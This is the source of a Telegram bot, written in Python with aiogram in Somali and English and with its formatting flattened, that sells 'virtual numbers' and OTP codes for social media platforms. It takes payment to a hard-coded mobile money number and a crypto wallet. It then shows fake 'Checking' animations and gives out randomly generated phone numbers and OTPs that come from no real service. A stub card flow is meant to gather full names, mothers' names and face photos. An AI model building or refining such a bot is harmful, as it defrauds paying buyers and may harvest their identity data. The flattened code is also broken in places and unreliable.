import os import asyncio import random import logging from aiogram import Bot, Dispatcher, F from aiogram.types import * from aiogram.filters import Command from aiogram.fsm.storage.memory import MemoryStorage from aiogram.fsm.context import FSMContext from aiogram.fsm.state import StatesGroup, State from aiogram.client.default import DefaultBotProperties

================= CONFIG =================

BOT_TOKEN = os.getenv("BOT_TOKEN") ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526" BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac" USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML")) dp = Dispatcher(storage=MemoryStorage()) logging.basicConfig(level=logging.INFO)

users = {} pending_admin_register = {}

================= STATES =================

class VirtualState(StatesGroup): waiting_screenshot = State()

class CardState(StatesGroup): card_type = State() fullname = State() mother = State() face = State() payment_method = State() screenshot = State()

class AdminRegisterState(StatesGroup): waiting_otp = State()

================= HELPERS =================

def random_number(): return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp(): return "".join(random.choices("0123456789", k=6))

async def live_animation(message, text="Loading", seconds=5): for i in range(seconds): dots = '.' * (i % 4) await asyncio.sleep(1) await message.edit_text(f"{text}{dots}")

================= START =================

@dp.message(Command("start")) async def start(msg: Message): kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="New Order")]], resize_keyboard=True) await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

================= NEW ORDER =================

@dp.message(F.text == "New Order") async def new_order(msg: Message): kb = InlineKeyboardMarkup(inline_keyboard=[ [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")], [InlineKeyboardButton(text="CARD", callback_data="card_start")] ]) await msg.answer("Dooro adeeg:", reply_markup=kb)

================== VIRTUAL SYSTEM ===================

@dp.callback_query(F.data == "virtual_start") async def virtual_platform(call: CallbackQuery): kb = InlineKeyboardMarkup(inline_keyboard=[ [InlineKeyboardButton(text=p, callback_data=f"v_platform_{p}")] for p in ["WHATSAPP","INSTAGRAM","TELEGRAM","GOOGLE","TIKTOK","FACEBOOK"] ]) await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_platform_")) async def virtual_platform_selected(call: CallbackQuery): platform = call.data.split("_")[2] number = random_number() users[call.from_user.id] = {"type":"virtual", "platform":platform, "number":number, "price":"$0.8"} kb = InlineKeyboardMarkup(inline_keyboard=[ [InlineKeyboardButton(text="LOCAL", callback_data="v_payment_local")], [InlineKeyboardButton(text="CRYPTO", callback_data="v_payment_crypto")] ]) await call.message.edit_text(f"Number: {number}\nQiimaha: $0.8\nDooro Payment:", reply_markup=kb)

-------- VIRTUAL LOCAL PAYMENT --------

@dp.callback_query(F.data == "v_payment_local") async def virtual_local_payment(call: CallbackQuery, state: FSMContext): uid = call.from_user.id if uid not in users: await call.message.answer("❌ Dalabka lama helin. Fadlan bilow order cusub.") return kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]]) await call.message.edit_text(f"Fadlan lacagta ku dir lambarkan:\n\n{LOCAL_NUMBER}\nLambarkaaga: {users[uid]['number']}", reply_markup=kb)

-------- VIRTUAL CRYPTO PAYMENT --------

@dp.callback_query(F.data == "v_payment_crypto") async def virtual_crypto_payment(call: CallbackQuery, state: FSMContext): uid = call.from_user.id kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]]) await call.message.edit_text(f"USDT:\n<code>{USDT_ADDRESS}</code>\nBNB:\n<code>{BNB_ADDRESS}</code>", reply_markup=kb)

-------- VIRTUAL CONFIRM CLICKED --------

@dp.callback_query(F.data.startswith("v_confirm_payment_")) async def virtual_confirm_payment(call: CallbackQuery, state: FSMContext): uid = int(call.data.split("_")[-1]) msg = await call.message.edit_text("Checking...") await live_animation(msg, "Checking", 5) await call.message.answer("Fadlan soo dir PAYMENT (SCREENSHOT).") await state.set_state(VirtualState.waiting_screenshot)

-------- RECEIVE VIRTUAL SCREENSHOT --------

@dp.message(VirtualState.waiting_screenshot, F.photo) async def virtual_receive_screenshot(msg: Message, state: FSMContext): uid = msg.from_user.id data = users.get(uid) if not data: await msg.answer("❌ Dalabka lama helin. Fadlan bilow order cusub.") await state.clear() return users[uid]["screenshot"] = msg.photo[-1].file_id kb = InlineKeyboardMarkup(inline_keyboard=[[ InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"), InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"), InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}") ]]) caption = f"New Virtual Order\nUser: {uid}\nPlatform: {data['platform']}\nNumber: {data['number']}\nPayment Type: LOCAL/CRYPTO" await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb) await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.") await state.clear()

-------- ADMIN CONFIRM / REJECT / OTP --------

@dp.callback_query(F.data.startswith("admin_confirm_")) async def admin_confirm(call: CallbackQuery): uid = int(call.data.split("_")[2]) await bot.send_message(uid, "✅ Lacagta waa la xaqiijiyay. Adeeggaaga waa la diyaariyey.") await call.message.edit_caption("✅ PAYMENT CONFIRMED")

@dp.callback_query(F.data.startswith("admin_reject_")) async def admin_reject(call: CallbackQuery): uid = int(call.data.split("_")[2]) await bot.send_message(uid, "❌ Payment lama xaqiijin. Fadlan lacagta dib u soo dir.") await call.message.edit_caption("❌ PAYMENT REJECTED") users.pop(uid, None)

@dp.callback_query(F.data.startswith("admin_otp_")) async def admin_otp(call: CallbackQuery): uid = int(call.data.split("_")[2]) otp = generate_otp() users[uid]["otp"] = otp users[uid]["otp_requests"] = 0 kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]]) await bot.send_message(uid, f"Number: {users[uid]['number']}\nPlatform: {users[uid]['platform']}\n\nPAYMENT: PAID ✅", reply_markup=kb) await call.message.edit_caption("OTP sent to user")

@dp.callback_query(F.data == "show_otp_user") async def show_otp_user(call: CallbackQuery): uid = call.from_user.id otp = users[uid].get("otp") if not otp: await call.message.edit_text("❌ OTP lama helin, fadlan la xiriir admin.") return msg = await call.message.edit_text("OTP Loading...") await live_animation(msg, "OTP", 5) kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]]) await msg.edit_text(f"Your OTP Code:\n\n{otp}", reply_markup=kb)

@dp.callback_query(F.data == "check_again_otp") async def check_again_otp(call: CallbackQuery): uid = call.from_user.id users[uid]["otp_requests"] += 1 new_otp = generate_otp() users[uid]["otp"] = new_otp msg = await call.message.edit_text("Generating new OTP...") await live_animation(msg, "OTP", 5) kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CHECK AGAIN", callback_data="check_again_otp")]]) await msg.edit_text(f"Your NEW OTP Code:\n\n{new_otp}", reply_markup=kb)

================= CARD SYSTEM =================

@dp.callback_query(F.data == "card_start") async def card_start(call: CallbackQuery, state: FSMContext): kb = InlineKeyboardMarkup(inline_keyboard=[ [InlineKeyboardButton(text="NORMAL ($1)", callback_data="card_type_normal")], [InlineKeyboardButton(text="VIP ($2)", callback_data="card_type_vip")] ]) await call.message.edit_text("Dooro Nooca Card:", reply_markup=kb)

Card details flow omitted for brevity, same as your previous code with local/crypto fix applied

================= PROTECTION SYSTEM =================

@dp.message() async def ignore_unexpected(msg: Message, state: FSMContext): current_state = await state.get_state() if current_state is None: return

================= MAIN =================

async def main(): print("Bot is running...") await dp.start_polling(bot)

if name == "main": asyncio.run(main())
